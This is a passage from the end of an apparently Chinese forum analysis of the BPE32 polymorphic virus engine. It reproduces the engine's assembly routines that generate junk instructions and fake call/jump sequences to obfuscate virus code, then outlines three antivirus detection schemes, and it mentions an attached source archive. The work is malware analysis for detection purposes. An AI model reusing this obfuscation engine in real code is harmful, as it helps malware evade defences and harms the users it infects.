  je r\_ran  
  stosb  
  ret  
j2:  call junx2  
  db  8bh    ;mov eax, ...  
  db  03h    ;add eax, ...  
  db  13h    ;adc eax, ...  
  db  2bh    ;sub eax, ...  
  db  1bh    ;sbb eax, ...  
  db  0bh    ;or eax, ...  
  db  33h    ;xor eax, ...  
  db  23h    ;and eax, ...  
  db  33h    ;test eax, ...  
  
junx2:  pop esi      ;two byte junk instruction  
  push 9  
  call random  
  add esi, eax  
  movsb  
  push 8  
  call random  
  add al, 11000000b  
  stosb  
r\_end:  ret  
j5:  call junx5  
  db  0b8h    ;mov eax, ...  
  db  05h    ;add eax, ...  
  db  15h    ;adc eax, ...  
  db  2dh    ;sub eax, ...  
  db  1dh    ;sbb eax, ...  
  db  0dh    ;or eax, ...  
  db  35h    ;xor eax, ...  
  db  25h    ;and eax, ...  
  db  0a9h    ;test eax, ...  
  db  3dh    ;cmp eax, ...  
  
junx5:  pop esi      ;five byte junk instruction  
  push 10  
  call random  
  add esi, eax  
  movsb  
  push 0  
  call random  
  stosd  
  ret  
jcj:  call rjunkjc    ;junk  
  push edx      
  push ebx    ;junk  
  push ecx      
  mov al, 0e8h    ;CALL label1   
  stosb        
  push edi      
  stosd        
  push edi      
  call rjunkjc      
  mov al, 0e9h    ;JMP label2    
  stosb  
  mov ecx, edi  
  stosd  
  mov ebx, edi            ; 保存后方要修改 jmp 地址时的 EDI，  
  call rjunkjc  
  pop eax  
  sub eax, edi  
  neg eax  
  mov edx, edi  
  pop edi  
  stosd  
  mov edi, edx  
  call rjunkjc  
  mov al, 0c3h            ; ret   
  stosb  
  call rjunkjc  
  sub ebx, edi            ;前面指令 jmp 后的地址值  
  neg ebx  
  xchg eax, ebx  
  push edi  
  mov edi, ecx  
  stosd  
  pop edi  
  call rjunkjc  
  pop ecx  
  pop ebx  
  pop edx  
  ret  
rjunk  endp  
BPE32     EndP      ;BPE32 ends here  
  
四 检测方案  
   针对 BPE32 产生的代码大致可以有三种检测方案（当然也可能有更多）；  
   1 通过 VM 仿真执行，解密后按特征码方式匹配，仿真结束的标志可以通过连续内存操作结束来判断。  
   2 通过识别 SEH 部分来检测是否被 bpe32 多态引擎感染过，首先可以通过带通配符的检测方法，定位到 seh 部分，当识别到 inc byte ptr \[Rx\] 引发异常，及后面的 jmp start 时，即可判断被感染(当然该方案不准确，存在误报)。  
   3 如果方案 1 的特征匹配失效过，可对 vm 仿真解密后 buff 进行算法扫描，具体方案，记录第一个 call 指令后的地址设为 v\_callnext，而后搜索重定位代码，之后如发现连续的寄存器操作则计算该操作值（大家可查看前面的解析，执行到这一步时是进行解密前源数据的获取，当然这其中包含插入的垃圾指令）以上面的代码为例，执行的是如下代码：  
      0040203A    68 CB3B97F7     PUSH F7973BCB                   ;构造一个随机加密的密钥，使得 ecx 指向最初的一个 call 调用  
      0040203F    59              POP ECX                        ;这里 ecx 寄存器是随机生成的  
      00402040    81F1 CE1BD7F7   XOR ECX,F7D71BCE  
if（v\_callnext == F7973BCB ^ F7D71BCE）  
{  
   printf("found Polymorphic virus\\n");  
}     
   该搜索过程需要设置步长（100 字节以内就可以），方案 3 检测速度慢，同样存在误报问题。  
   以上就是针对 BPE32 的多态引擎分析，如有分析不正确的地方还望大家不吝指正，也可通过邮件我们一起交流。         
    附参考文献:  
\[1\] Benny‘s .《Benny's Polymorphic Engine for Win32》  
大家感兴趣可以一起讨论，或者 mail，附上 bpe32 源代码。  
neineit@gmail.com

上传的附件
| ![](img/fb8ade91a9e54b7bd6690c3ae5b1d1cc.jpg) || bpe32.zip  
 |
|   
 ||  |